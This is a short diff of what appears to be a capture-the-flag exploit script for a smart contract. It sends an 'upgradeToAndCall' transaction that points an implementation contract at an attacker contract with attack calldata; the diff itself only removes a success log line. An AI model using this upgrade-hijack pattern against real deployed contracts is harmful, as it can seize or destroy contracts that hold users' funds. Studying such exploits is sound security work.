@@ -34,8 +34,6 @@ async function main() {
   const upgradeToAndCallCallData = upgradeToAndCallInterface.encodeFunctionData("upgradeToAndCall", [engineAttacker.address, attackCallData]); 
 
   await (await signer.sendTransaction({ to: implAddr, data: upgradeToAndCallCallData })).wait();
-
-  console.log("Succesful attack!");
 }
 
 main()
